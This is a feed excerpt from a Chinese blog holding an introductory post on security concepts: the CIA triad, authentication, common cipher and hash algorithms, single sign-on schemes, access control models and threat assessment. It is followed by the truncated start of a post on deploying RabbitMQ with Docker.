class="headerlink" title="可用性"></a>可用性</h3><p>可用性应该是你最熟悉的原则。因为它不仅仅是安全方向上的问题，也是工程上面临的主要挑战。用一句话来说就是，可用性就是确保数据能够被授权的主体访问到， 简单来说，就是“可读”。</p><p>举个典型的例子，面对高峰期的集中用户访问，如何保障用户能够正常地获取数据（“双 11”购物或者 DDoS 攻击等），你可以看到大量的研发人员对这个问题进行探讨和分享，但这其实都属于安全在可用性上的考量范围。</p><p>在安全机制上，我们要确保授权机制能够正确运行，使得拥有访问数据的主体能够及时地被授权，这是可用性的基本。那具体来说，可用性会面临哪些挑战呢？</p><ul><li>在运维层面上，有很多技术在为可用性提供支撑，比如，在基础建设上的机房建设（如何在断电、高温、火灾等情况下保护设备）、多地冗余，以及在服务中的备份、资源冗余等。</li><li>在研发层面上，如何降低响应延迟、如何处理海量数据、如何在峰值进行扩容等，这些问题其实都是在可用性上的挑战。</li><li>在攻击的角度上，黑客也会对可用性发起攻击，也就是我们常说的 DoS（Denial of Service，拒绝服务）攻击。比如，通过发送大量的流量来占满带宽资源。</li></ul><p><strong>小结</strong></p><ul><li>安全的基本原则：机密性，完整性，可用性。简称CIA。</li><li>机密性强调的是不可见性，数据只能被授权的主体访问。</li><li>完整性强调的是不可改，数据只能最追加操作，对数据的修改过程进行日志记录。</li><li>可用性强调的是可读，数据的可达性。</li></ul><h2 id="安全原则"><a href="#安全原则" class="headerlink" title="安全原则"></a>安全原则</h2><p>不同的应用、不同的模块会受到不同的安全威胁，当然，我们面对这些威胁也会有不同的解决方案。万变不离其宗。正如安全威胁都是针对 CIA 三元组产生的攻击一样，安全解决方案在根本思路上也都是相通的。</p><h3 id="什么是“黄金法则”？"><a href="#什么是“黄金法则”？" class="headerlink" title="什么是“黄金法则”？"></a>什么是“黄金法则”？</h3><p>黄金法则主要包含三部分：认证（Authentication）、授权（Authorization）、审计（Audit）。为什么称它为“黄金”呢？一方面是因为，它包含的这三部分重要且通用；另一方面是因为，这三个单词的前两个字母都是 Au，而 Au 在元素周期表中代表着“金”。</p><p>有的教材中，会给黄金法则加上问责（Accounting）这一部分，组成“4A 法则”；还有的会加上身份识别（Identification），组成“IAAAA 法则”。不管被划分为几个部分，这些法则的中心内容都是相似的，都是围绕着识别、认证、授权、审计、问责这五个部分展开的。因此，黄金法则其实就是 IAAAA 法则更高一层的概括，它将识别和认证、审计和问责归纳到了一起，更加强调了这两两之间的协同性质。</p><p>这三部分其实是一种串联的关系，它描述的其实是用户在使用应用过程中的生命周期：先进行登录、再进行操作、最后留下记录。</p><p><img src="/images/security/security-concepts/2.jpg" alt="2"></p><h3 id="身份识别和认证"><a href="#身份识别和认证" class="headerlink" title="身份识别和认证"></a>身份识别和认证</h3><p>认证其实包括两个部分：身份识别和认证。身份识别其实就是在问“你是谁”，你会回答“你是你”。身份认证则会问“你是你吗”，那你要证明“你是你”这个回答是合法的。</p><p>身份识别和认证通常是同时出现的一个过程。身份识别强调的是主体如何声明自己的身份，而身份认证强调的是，主体如何证明自己所声明的身份是合法的。比如说，当你在使用用户名和密码登录的过程中，用户名起到身份识别的作用，而密码起到身份认证的作用；当你用指纹、人脸或者门卡等进行登入的过程中，这些过程其实同时包含了身份识别和认证。</p><p>依据具体的认证场景，对安全等级、易用性等的综合考量，认证形式可以大致分为三种。按照认证强度由弱到强排序，分别是：</p><ul><li>你知道什么（密码、密保问题等）；</li><li>你拥有什么（门禁卡、安全令牌等）；</li><li>你是什么（生物特征，指纹、人脸、虹膜等）。</li></ul><blockquote><p>我们通过将多种类型的认证进行组合，可以形成多因素认证机制，进一步加强认证强度。常见的，在登录过程中，很多应用会在输入完账号密码后，让你进行手机验证，这其实就是结合了“你知道什么”和“你拥有什么”的双因素认证。</p></blockquote><h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3><p>在确认完“你是你”之后，下一个需要明确的问题就是“你能做什么”。毫无疑问，在系统或者应用中，我们的操作都会受到一定的限制。比如，某些文件不可读，某些数据不可修改。这就是授权机制。除了对“你能做什么”进行限制，授权机制还会对“你能做多少”进行限制。比如，手机流量授权了你能够使用多少的移动网络数据。</p><h3 id="审计和问责"><a href="#审计和问责" class="headerlink" title="审计和问责"></a>审计和问责</h3><p>当你在授权下完成操作后，安全需要检查一下“你做了什么”，这个检查的过程就是审计。当发现你做了某些异常操作时，安全还会提供你做了这些操作的“证据”，让你无法抵赖，这个过程就是问责。</p><p>举一个生活中的例子，当你去银行办理业务时，工作人员会让你对一些单据签字。这些单据就是审计的信息来源，而签字则保证了你确认这是你进行的操作，这就是问责的体现。</p><p>审计和问责通常也是共同出现的一个过程，因为它们都需要共同的基础：日志。很容易理解，所谓审计，就是去通过日志还原出用户的操作历史，从而判断是否出现违规的操作。而问责则是通过日志的完整性，来确保日志还原出来的操作是可信的。</p><blockquote><p>安全不存在“银弹”，不可能达到 100% 的安全。即使是 1% 的漏洞，也可能造成 100% 的损伤。</p></blockquote><p><strong>小结</strong></p><p>黄金法则描述的是，在用户操作的各个环节中，我们所需要采取的安全策略。黄金法则的核心内容包括三部分：认证、授权、审计。大部分情况下，事前防御属于认证，事中防御属于授权，事后防御属于审计。</p><h2 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h2><p>密码学是“黄金法则”的基础技术支撑。失去了密码学的保护，任何认证、授权、审计机制都是“可笑”的鸡肋。</p><p>首先，先来普及一个语文知识。密钥中的钥，发音为 yuè，不是 yào。(口语中多读mìyào)。</p><h3 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h3><p>所谓对称加密，代表加密和解密使用的是同一个密钥。概念很简单，但是也很不具体、直观。</p><p><img src="/images/security/security-concepts/3.jpg" alt="3"></p><p>下面我来具体讲讲这个过程，如果我想给你发一段消息，又不想被其他人知道。那么我作为发送方，会使用加密算法和密钥，生成消息对应的密文；而你作为接收方，想要阅读消息，就需要使用解密算法和一个同样的密钥，来获得明文。</p><p>我们常见的经典对称加密算法有 DES、IDEA、AES、国密 SM1 和 SM4。</p><p><strong>第一种对称加密算法是 DES（数据加密标准，Data Encryption Standard）。</strong></p><p>DES 应该是最早的现代密码学算法之一。它由美国政府提出，密钥长度为 56 位。目前，它暴力破解 56 位密码的时间，已经能控制在 24 小时内了。</p><p>DES 实际上是一个过时的密码学算法，目前已经不推荐使用了。关于 DES，还有一点特别有意思。DES 包含一个关键模块：S 盒，其设计的原理一直没有公开。因此，很多人都相信，这个 S 盒中存在后门，只要美国政府需要，就能够解密任何 DES 密文。</p><p><strong>第二种对称加密算法是 IDEA（国际数据加密算法，International Data Encryption Algorithm）。</strong></p><p>IDEA 由瑞士研究人员设计，密钥长度为 128 位。对比于其他的密码学算法，IDEA 的优势在于没有专利的限制。相比于 DES 和 AES 的使用受到美国政府的控制，IDEA 的设计人员并没有对其设置太多的限制，这让 IDEA 在全世界范围内得到了广泛地使用和研究。</p><p><strong>第三种需要了解的对称加密算法是 AES（高级加密标准，Advanced  Encryption  Standard）。</strong></p><p>在 DES 被破解后，美国政府推出了 AES 算法，提供了 128 位、192 位和 256 位三种密钥长度。通常情况下，我们会使用 128 位的密钥，来获得足够的加密强度，同时保证性能不受影响。目前，AES 是国际上最认可的密码学算法。在算力没有突破性进展的前提下，AES 在可预期的未来都是安全的。</p><p><strong>最后一种是国密 SM1（SM1 Cryptographic Algorithm）和 SM4（SM4 Cryptographic Algorithm）。</strong></p><p>密码学作为安全的基础学科，如果全部依靠国外的技术，对于国家安全可能产生不利影响。因此，中国政府提出了一系列加密算法。其中，国密算法 SM1 和 SM4 都属于对称加密的范畴。SM1 算法不公开，属于国家机密，只能通过相关安全产品进行使用。而 SM4 属于国家标准，算法公开，可自行实现使用。国密算法的优点显而易见：受到国家的支持和认可。</p><p><img src="/images/security/security-concepts/4.jpg" alt="4"></p><p>在加密通信中（如 HTTPS、VPN、SSH 等），通信双方会协商出一个加密算法和密钥，对传输的数据进行加密，从而防止第三方窃取。在类似数据库加密这种存储加密技术中，通信双方也是将存储空间中的数据进行加密，这样即使硬盘被物理窃取，也不会导致信息丢失。在公司内部，为了避免用户的 Cookie 和隐私信息发生泄露，也需要对它们进行加密存储。</p><p>对于大部分公司来说，选取 AES128 进行加解密运算，就能获得较高的安全性和性能。如果是金融或政府行业，在涉及国家层面的对抗上，有一定的合规需求，则需要应用国密算法。</p><p>另外，在选取加密算法的时候，存在不同的分组计算模式：ECB/CBC/CFB/OFB/CTR。这些模式的具体细节不是我们学习的重点，在这里就不展开了。你需要知道的是：选取 CBC 和 CTR 这两种推荐使用的模式就可以满足大部分需求了，它们在性能和安全性上都有较好的保证。</p><h3 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h3><p>非对称加密代表加密和解密使用不同的密钥。具体的加解密过程就是，发送方使用公钥对信息进行加密，接收方收到密文后，使用私钥进行解密。</p><p><img src="/images/security/security-concepts/5.jpg" alt="5"></p><p>当使用对称加密算法的时候，你不仅要跟每一个通信方协定一个密钥，还要担心协商过程中密钥泄露的可能性。比如，我当面告诉了你一个密码，怎么保证不被偷听呢？而在非对称加密算法中，公钥是公开信息，不需要保密，我们可以简单地将一个公钥分发给全部的通信方。也就是说，我现在就可以告诉你一个公钥密码，即使这意味着所有阅读这篇文章的人都知道了这个密码，那也没关系。因此，非对称密钥其实主要解决了密钥分发的难题。</p><p>除了加密功能外，大部分的非对称算法还提供签名的功能。这也就是说，我们可以使用私钥加密，公钥解密。一旦接收方通过公钥成功解密，我们就能够证明发送方拥有对应的私钥，也就能证实发送方的身份，也就是说，私钥加密就是我们说的签名。</p><p>所有的非对称加密算法，都是基于各种数学难题来设计的，这些数学难题的特点是：正向计算很容易，反向推倒则无解。经典的非对称加密算法包括：RSA、ECC 和国密 SM2。</p><p><strong>第一种非对称加密算法 RSA（RSA 加密算法，RSA Algorithm）。</strong></p><p>RSA 的数学难题是：两个大质数 p、q 相乘的结果 n 很容易计算，但是根据 n 去做质因数分解得到 p、q，则需要很大的计算量。RSA 是比较经典的非对称加密算法，它的主要优势就是性能比较快，但想获得较高的加密强度，需要使用很长的密钥。</p><p><strong>第二种 ECC（椭圆加密算法，Elliptic Curve Cryptography）。</strong></p><p>ECC 是基于椭圆曲线的一个数学难题设计的。目前学术界普遍认为，椭圆曲线的难度高于大质数难题，160 位密钥的 ECC 加密强度，相当于 1088 位密钥的 RSA。因此，ECC 是目前国际上加密强度最高的非对称加密算法。</p><p><strong>最后一种是国密 SM2（SM2 Cryptographic Algorithm）。</strong></p><p>国密算法 SM2 也是基于椭圆曲线问题设计的，属于国家标准，算法公开，加密强度和国际标准的 ECC 相当。而国密的优势在于国家的支持和认可。</p><p><img src="/images/security/security-concepts/6.jpg" alt="6"></p><p>对比于对称加密算法，非对称加密算法最大的优势就是解决密钥分发的问题。因此，现在大部分的认证和签名场景，其实使用的都是非对称加密算法。比如，在 SSH 登录、Git 上传等场景中，我们都可以将自己的公钥上传到服务端，然后由客户端保存私钥。如果你遇到需要使用非对称加密的场景（比如多对一认证），我推荐你使用 ECC 算法。</p><h3 id="散列算法"><a href="#散列算法" class="headerlink" title="散列算法"></a>散列算法</h3><p>散列算法应该是最常见到的密码学算法了。大量的应用都在使用 MD5 或者 SHA 算法计算一个唯一的 id。比如 Git 中的提交记录、文件的完整性校验、各种语言中字典或者 Map 的实现等等。很多场景下，我们使用散列算法并不是为了满足什么加密需求，而是利用它可以对任意长度的输入，计算出一个定长的 id。</p><p>作为密码学的算法，散列算法除了提供唯一的 id，其更大的利用价值还在于它的不可逆性。除了不可逆性，在密码学上，我们对散列算法的要求还有：鲁棒性（同样的消息生成同样的摘要）、唯一性（不存在两个不同的消息，能生成同样的摘要）。</p><p>经典的散列算法包括 MD5、SHA、国密 SM3。</p><p><strong>MD5（消息摘要算法，Message-Digest Algorithm 5）。</strong></p><p>MD5 可以用来生成一个 128 位的消息摘要，它是目前应用比较普遍的散列算法。虽然，因为算法的缺陷，它的唯一性已经被破解了，但是大部分场景下，这并不会构成安全问题。但是，如果不是长度受限（32 个字符），我还是不推荐你继续使用 MD5 的。</p><p><strong>SHA（安全散列算法，Secure Hash Algorithm）。</strong></p><p>SHA 是美国开发的政府标准散列算法，分为 SHA-1 和 SHA-2 两个版本，SHA-2 细分的版本我们就不介绍了。和 MD5 相同，虽然 SHA 的唯一性也被破解了，但是这也不会构成大的安全问题。目前，SHA-256 普遍被认为是相对安全的散列算法，也是我最推荐你使用的散列算法。</p><p><strong>国密 SM3（SM3 Cryptographic Algorithm）。</strong></p><p>国密算法 SM3 是一种散列算法。其属于国家标准，算法公开，加密强度和国际标准的 SHA-256 相当。和国密 SM2 一样，它的优势也在于国家的支持和认可。</p><p><img src="/images/security/security-concepts/7.jpg" alt="7"></p><p>另外，我们在使用散列算法的时候，有一点需要注意一下，一定要注意加“盐”。所谓“盐”，就是一串随机的字符，是可以公开的。将用户的密码“盐”进行拼接后，再进行散列计算，这样，即使两个用户设置了相同的密码，也会拥有不同的散列值。同时，黑客往往会提前计算一个彩虹表来提升暴力破解散列值的效率，而我们能够通过加“盐”进行对抗，黑客需要为每个盐值计算一个彩虹表(为每一个用户建立一张彩虹表，而建表的过程，其实就和暴力破解的效果一样了)。“盐”值越长，安全性就越高。</p><p><strong>小结</strong></p><p>总的来说，在使用的时候，你要记住下面这些内容：对称加密具备较高的安全性和性能，要优先考虑。在一对多的场景中（如多人登录服务器），存在密钥分发难题的时候，我们要使用非对称加密；不需要可逆计算的时候（如存储密码），我们就使用散列算法。</p><p>在具体算法的选取上，你只需要记住：对称加密用 AES-CTR、非对称加密用 ECC、散列算法用 SHA256 加盐。这些算法就能够满足大部分的使用场景了，并且在未来很长一段时间内，都可以保持一个较高的安全强度。</p><p>如果使用https协议，用户在密码输入时，是否还需要在前端（通过JS）进行散列加密？</p><p>https可以保证传输过程中不被窃听。但最好还是对密码作散列，因为你同样需要保证服务端的密码不被泄露。最简单的，明文传输的话，你如何保证开发人员不会监守自盗？</p><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="身份认证包括哪些东西？"><a href="#身份认证包括哪些东西？" class="headerlink" title="身份认证包括哪些东西？"></a>身份认证包括哪些东西？</h3><p>首先，身份认证不仅仅是一个输入账号密码的登录页面而已，应用的各个部分都需要涉及身份认证。身份认证可以分为两个部分：对外认证和对内认证。</p><p>对外认证，其实就是应用的登录注册模块，它面向用户进行认证。对外认证的入口比较集中，一个应用通常只有一个登录入口。因此，我们可以在登录这个功能上，实现很多种认证的方式。这就可以用到我们之前提到的“你知道什么、你拥有什么、你是什么”。</p><p>除了应用本身需要有登录注册的模块，应用的各种内部系统同样需要涉及登录认证的功能，比如：服务器的登录、数据库的登录、Git 的登录、各种内部管理后台的登录等等。这也就是我所说的对内认证。</p><p>对外认证是单一场景下的认证，对内认证是多场景下的认证。</p><p><img src="/images/security/security-concepts/8.jpg" alt="8"></p><h3 id="身份认证主要面临哪些威胁？"><a href="#身份认证主要面临哪些威胁？" class="headerlink" title="身份认证主要面临哪些威胁？"></a>身份认证主要面临哪些威胁？</h3><p>首先，没有认证环节是所有应用和公司存在的最普遍的问题。尤其是在对内认证的部分，我们经常会看到，很多公司的数据库、接口、管理后台在使用的时候，并不需要经过认证这个环节。</p><p>除了没有认证环节的直接“裸奔”，弱密码也是一个普遍存在的问题。我常常觉得，安全最大的敌人是人类的惰性。设计一个好记的强密码并不是一件简单的事情，这也是弱密码屡禁不止的原因。</p><p>说完了无认证和弱密码，接下来我们来聊一聊认证信息泄露。所谓认证信息泄露，就是指黑客通过各种手段，拿到了用户的密码信息和身份凭证这样的认证信息。常见的手段包括钓鱼、拖库等等。更可怕的是，很多攻击对于用户来说都是无感知的。</p><p>你可以在 <a href="https://haveibeenpwned.com" target="_blank" rel="noopener">haveibeenpwned</a> 中，输入自己的账号信息，测试一下它们是否被泄露了。如果显示“Oh no -powned!”，那就说明你的邮箱密码已经被泄露了，我建议你可以尽快修改你的密码了。</p><p>除了密码的直接泄露以外，大部分的登录系统都无法应对重放攻击。重放攻击简单来说就是，黑客在窃取到身份凭证（如 Cookie、Session ID）之后，就可以在无密码的情况下完成认证了。</p><p>总结来说，身份认证面临的威胁其实都是认证信息的泄露。这其中，既可能是应用本身就没有认证信息或者认证信息强度比较弱，使得黑客可以通过猜测的方式快速获取认证信息；也有可能是黑客通过一些攻击手段（如窃听等），从用户那获取了认证信息，从而冒充用户进行登录。</p><h3 id="身份认证的安全怎么保证？"><a href="#身份认证的安全怎么保证？" class="headerlink" title="身份认证的安全怎么保证？"></a>身份认证的安全怎么保证？</h3><p>解决安全问题，不只是在解决一个技术问题，还要培养外部用户和内部员工的安全意识。</p><p>比如，对密码的强度进行限制（如强制使用字母、数字、特殊字符的组合密码，并达到一定长度），强制用户定期修改密码，对关键操作设置第二密码（如微信、支付宝的支付密码）等等。通过手机验证替代密码验证（因为丢失手机的几率比丢失密码的几率低）；通过人脸、指纹等生物特征替代密码。</p><p>除此之外，我们还可以通过加密信道（如 HTTPS）来防止窃听；也可以通过给下发的凭证设置一个有效期，来限制凭证在外暴露的时间，以此来减少重放攻击带来的影响。</p><p>这里面有一点你要注意，身份认证的最大的问题还是在于身份管理。随着公司业务的不断扩张，当账号体系变得越来越复杂时，如何对这些账号进行统一的管理，是解决身份认证问题的关键。而单点登录就是一个非常有效的解决方案。</p><h3 id="单点登录如何解决身份认证问题？"><a href="#单点登录如何解决身份认证问题？" class="headerlink" title="单点登录如何解决身份认证问题？"></a>单点登录如何解决身份认证问题？</h3><p>单点登录（Single Sign On，SSO）到底是什么呢？单点登录的概念很简单：用户只需要进行一次认证，就可以访问所有的网页、应用和其他产品了。随着互联网产品形式的不断发展，单点登录的实现方式也经历了多次的升级革新。几种典型的单点登录方式：CAS 流程、JWT、OAuth 和 OpenID。</p><p><strong>CAS（Central Authentication Service，集中式认证服务）流程。</strong></p><p>CAS 是一个开源的单点登录框架，它不属于某一种单点登录的实现方式，而是提供了一整套完整的落地方案。</p><p><img src="/images/security/security-concepts/9.jpg" alt="9"></p><ol><li>假如用户现在要访问某个应用。比如极客时间 App。</li><li>应用需要进行认证，但应用本身不具备认证功能。因此，应用将用户重定向至认证中心的页面。比如，你在登录一个应用的时候，它显示你可以选择微信、QQ、微博账号进行登录，你点击微信登录，就跳转至微信的登录页面了。</li><li>用户在认证中心页面进行认证操作。如果用户之前已经在其他应用进行过认证了，那么认证中心可以直接识别用户身份，免去用户再次认证的过程。</li><li>认证完成后，认证中心将认证的凭据，有时会加上用户的一些信息，一起返回给客户端。也就是你在微信登录完成后，回到了极客时间 App。</li><li>客户端将凭据和其他信息发送给应用，也就是说，极客时间 App 将微信的登录凭据发送给了极客时间后端。</li><li>应用收到凭据后，可以通过签名的方式，验证凭据的有效性。或者，应用也可以直接和认证中心通信，验证凭据并获取用户信息。这也就是为什么极客时间能够拿到你的微信头像了。</li><li>用户完成认证。</li></ol><p><strong>JWT（JSON Web Token）是一种非常轻量级的单点登录流程。</strong></p><p>它会在客户端保存一个凭证信息，之后在你每一次登录的请求中都带上这个凭证，将其作为登录状态的依据。JWT 的好处在于，不需要应用服务端去额外维护 Cookie 或者 Session 了。但是，正是因为它将登录状态落到了客户端，所以我们无法进行注销等操作了。</p><p><strong>OAuth（Open Authorization）的主要特点是授权。</strong></p><p>我们通常用 QQ、微信登录其他应用时所采用的协议。通过 OAuth，用户在完成了认证中心的登录之后，应用只能够验证用户确实在第三方登录了。但是，想要维持应用内的登录状态，应用还是得颁发自己的登录凭证。这也就是为什么 QQ 授权后，应用还需要绑定你的手机号码。这也就意味着，应用是基于 QQ 的信息创建了一个自身的账号。</p><p><strong>OpenID（Open Identity Document）和 OAuth 的功能基本一致。</strong></p><p>但是，OpenID 不提供授权的功能。最常见的，当我们需要在应用中使用微信支付的时候，应用只需要收集支付相关的信息即可，并不需要获取用户的微信头像。</p><p>在实际情况中，基于各种业务需求的考虑，很多公司都倾向于自己去实现一套 SSO 的认证体系，它的认证流程如下图所示：</p><p><img src="/images/security/security-concepts/10.jpg" alt="10"></p><p>在这个流程中，应用的服务器直接接收用户的认证信息，并转发给认证中心。对用户来说，这个认证中心是完全透明的。但是，这个流程给予了应用过多的信任，从安全性方面考量的话，是不合理的。在这个过程中，应用直接获取到了用户的认证信息，但应用能否保护好这些信息呢？我们并没有有效的办法去做确认。</p><p>因此，我的建议是，多花一些功夫去接入成熟的单点登录体系，而不是自己去实现一个简化版的。JWT 适用范围广，在单点登录的选取上面，如果想要将用户信息做统一管理，选择它最为简单；如果认证中心只是被用来维护账号密码，由业务去维护用户所绑定的其他手机等信息，那么，采用 OAuth 更合适。</p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>“授权”和“访问控制”其实是同一个概念，都是允许或者禁止某个用户做某件事情。现在行业内普遍用“访问控制”这个术语来讨论相关问题。</p><h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p><img src="/images/security/security-concepts/11.jpg" alt="11"></p><p>如何具体的理解这个模型呢？你可以这样想：在用户去读取文件的过程中，用户是主体，读取这个操作是请求，文件是客体。</p><ul><li>主体：请求的发起者。主体可以是用户，也可以是进程、应用、设备等任何发起访问请求的来源。</li><li>客体：请求的接收方，一般是某种资源。比如某个文件、数据库，也可以是进程、设备等接受指令的实体。</li><li>请求：主体对客体进行的操作。常规的是读、写和执行，也可以进一步细分为删除、追加等粒度更细的操作。</li></ul><h3 id="常见的访问控制机制"><a href="#常见的访问控制机制" class="headerlink" title="常见的访问控制机制"></a>常见的访问控制机制</h3><p>常见的访问控制机制有 4 种：DAC、role-BAC、rule-BAC、MAC。</p><p><strong>DAC（Discretionary Access Control，自主访问控制）。</strong></p><p>DAC 就是让客体的所有者来定义访问控制规则。想象一下，你想要从图书馆中拿走一本书。这个时候，管理员说，“你经过这本书的所有人同意了吗？”这个过程就是 DAC。</p><p>在 DAC 中，访问控制的规则维护完全下发到了所有者手上，管理员在理论上不需要对访问控制规则进行维护。因此，DAC 具备很高的灵活性，维护成本也很低。相对的，尽管 DAC 降低了管理员的工作难度，但是会增加整体访问控制监管的难度，以至于安全性完全取决于所有者的个人安全意识。</p><p>这么说来，DAC 的特性其实就是将安全交到了用户手中，因此，DAC 适合在面向用户的时候进行使用。当用户需要掌控自己的资源时，我们通常会采取 DAC，来完成访问控制。比方说，Linux 中采用的就是 DAC，用户可以控制自己的文件能够被谁访问。</p><p><strong>role-BAC（role  Based Access Control，基于角色的访问控制）。</strong></p><p>role-BAC 就是将主体划分为不同的角色，然后对每个角色的权限进行定义。我们还是以图书馆为例。当你想借书的时候，管理员说，“你是学生吗？”这个过程就是 role-BAC。管理员只需要定义好每一个角色所具备的功能权限，然后将用户划分到不同的角色中去，就完成了访问控制配置的过程。</p><p>role-BAC 是防止权限泛滥，实现最小特权原则的经典解决方案。试想一下，假如没有角色的概念，那么管理员需要给每一个用户都制定不同的权限方案。当用户的岗位或职责发生变更时，理论上管理员需要对这个用户的权限进行重新分配。但是，准确识别每一个用户需要哪些权限、不需要哪些权限，是一个很有挑战的工作。如果采用了 role-BAC，那么管理员只需要简单地将用户从一个角色转移到另一个角色，就可以完成权限的变更。</p><p>因此，role-BAC 更适合在管理员集中管理的时候进行使用。在这种情况下，所有的权限都由管理员进行分配和变更，所以，使用 role-BAC 可以大大降低管理员的工作难度，提高他们的工作效率。同样的原理也适用于应用，应用可以对不同的角色限定不同的操作权限，比如：运维人员给开发、产品、运维划分不同的机器操作权限。</p><p><strong>rule-BAC（rule Based Access Control，基于规则的访问控制）。</strong></p><p>rule-BAC 就是制定某种规则，将主体、请求和客体的信息结合起来进行判定。在 rule-BAC 的控制机制中，如果你想要在图书馆借书，管理员会说，“根据规定，持有阅览证就可以借书。”</p><p>相比较来说，DAC 是所有者对客体制定的访问控制策略，role-BAC 是管理员对主体制定的访问控制策略，而 rule-BAC 可以说是针对请求本身制定的访问控制策略。</p><p>在 rule-BAC 中，有一点需要我们注意。那就是，我们需要定义是“默认通过”还是“默认拒绝”，即当某次请求没有命中任何一条规则时，我们是应该让它“通过”还是“拒绝”呢？这需要根据安全的需求来进行综合考量。</p><p>比如，某个服务只提供了 80 和 443 端口的 Web 服务，那么防火墙配置的规则是允许这两个端口的请求通过。对于其他任何请求，因为没有命中规则，所以全部拒绝。这就是“默认拒绝”的策略。很多时候，为了保障更高的可用性，应用会采取“默认通过”的策略。</p><p>rule-BAC 适合在复杂场景下提供访问控制保护，因此，rule-BAC 相关的设备和技术在安全中最为常见。一个典型的例子就是防火墙。防火墙通过将请求的源 IP 和端口、目标 IP 和端口、协议等特征获取到后，根据定义好的规则，来判定是否允许主体访问。比如，限制 22 端口，以拒绝 SSH 的访问。同样地，应用也往往会采取风控系统，对用户异常行为进行判定。</p><p><strong>MAC（Mandatory Access Control，强制访问控制）。</strong></p><p>MAC 是一种基于安全级别标签的访问控制策略。只看这个定义你可能不太理解，我们还是用图书馆的例子来解释一下，当你在图书馆排队借书的时候，听到管理员说：“初中生不能借阅高中生的书籍。”这就是一种强制访问控制。在互联网中，主体和客体被划分为“秘密、私人、敏感、公开”这四个级别。MAC 要求对所有的主体和客体都打上对应的标签，然后根据标签来制定访问控制规则。</p><p>比如：为了保证机密性，MAC 不允许低级别的主体读取高级别的客体、不允许高级别的主体写入低级别的客体；为了保证完整性，MAC 不允许高级别的主体读取低级别的客体，不允许低级别的主体写入高级别的客体。这么说有些难以理解，我们可以这样来记：机密性不能低读、高写；完整性不能高读、低写。</p><p>MAC 是安全性最高的访问控制策略。但它对实施的要求也很高，需要对系统中的所有数据都进行标记。在实际工作中，想要做到这一点并不容易。每一个应用和系统，每时每刻都在不停地生产新的数据，数据也不停地在各个系统之间流转。你需要对这些行为进行全面的把控，才能将标签落地。因此，MAC 仅仅会出现在政府系统中，普通公司在没有过多的合规需求下，不会采取 MAC。</p><p><img src="/images/security/security-concepts/12.jpg" alt="12"></p><h3 id="威胁评估的步骤"><a href="#威胁评估的步骤" class="headerlink" title="威胁评估的步骤"></a>威胁评估的步骤</h3><p>威胁评估主要有三个步骤：识别数据、识别攻击、识别漏洞。</p><p>我们先来看一下识别数据。我们知道，安全保护的核心资产就是数据。因此，威胁评估的第一步就是去识别数据。识别数据的最终目的是，当发生攻击，某一份数据的 CIA 受到影响时，会对公司造成多大的损失。这也是我们衡量安全投入高低的一个主要指标。</p><p>一般情况下，在识别完数据之后，我们就能推测出黑客会采取哪些方式进行攻击，这也就到了第二个步骤：识别攻击。识别攻击的核心就是，明确什么样的数据有价值被攻击。比如，对于公开的数据，没有被窃取的意义，所以黑客只会通过爬虫来抓站，而不会花费更大的成本去盗号。</p><p>在识别了数据和攻击之后，我们就需要根据应用去识别可能的漏洞了。这也就是第三个步骤：识别漏洞。比如，对于 Web 应用，它可能出现诸如 XSS、SQL 注入等 Web 漏洞。关于这一点，业内将常见的攻击和漏洞进行了总结。比如，近两年来由 MITRE 提出的ATTACK框架比较知名。在识别漏洞的时候，我们可以基于这些总结性框架去进行罗列。</p><p>通过对数据、攻击、漏洞的识别，你就能够知道，公司当前面临了哪些潜在的威胁，从而可以去思考解决方案，并推动它的落地。通常来说，我们需要定期（比如每年）对公司进行一次全面的威胁评估工作，并且随着公司的发展，不断调整安全方案。</p><h2 id="脑图"><a href="#脑图" class="headerlink" title="脑图"></a>脑图</h2><p><img src="/images/security/security-concepts/13.jpg" alt="13"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>极客时间《安全攻防技能30讲》</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;安全基础概念&lt;/p&gt;
    
    </summary>
    
    
      <category term="Security" scheme="https://xinlichao.cn/categories/Security/"/>
    
    
      <category term="security" scheme="https://xinlichao.cn/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>Docker 部署 RabbitMQ 集群</title>
    <link href="https://xinlichao.cn/back-end/docker/docker-rabbitmq/"/>
    <id>https://xinlichao.cn/back-end/docker/docker-rabbitmq/</id>
    <published>2020-07-05T19:00:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>RabbitMQ 是一种消息中间件，用于处理来自客户端的异步消息。服务端将要发送的消息放入到队列池中。接收端可以根据RabbitMQ配置的转发机制接收服务端发来的消息。RabbitMQ依据指定的转发规则进行消息的转发、缓冲和持久化操作，主要用在多服务器间或单服务器的子系统间进行通信，是分布式系统标准的配置。</p><a id="more"></a><h2 id="RabbitMQ-使用场景"><a href="#RabbitMQ-使用场景" class="headerlink" title="RabbitMQ 使用场景"></a>RabbitMQ 使用场景</h2><h3 id="服务解耦"><a href="#服务解耦" class="headerlink" title="服务解耦"></a>服务解耦</h3><p>假设有这样一个场景, 服务A产生数据, 而服务B,C,D需要这些数据, 那么我们可以在A服务中直接调用B,C,D服务,把数据传递到下游服务即可</p><p>但是,随着我们的应用规模不断扩大,会有更多的服务需要A的数据,如果有几十甚至几百个下游服务,而且会不断变更,再加上还要考虑下游服务出错的情况,那么A服务中调用代码的维护会极为困难</p><p>这是由于服务之间耦合度过于紧密</p><p><img src="/images/docker/docker-rabbitmq/1.png" alt="1"></p><p>再来考虑用RabbitMQ解耦的情况</p><p>A服务只需要向消息服务器发送消息,而不用考虑谁需要这些数据;下游服务如果需要数据,自行从消息服务器订阅消息,不再需要数据时则取消订阅即可</p><p><img src="/images/docker/docker-rabbitmq/2.png" alt="2"></p><h3 id="流量削峰"><a href="#流量削峰" class="headerlink" 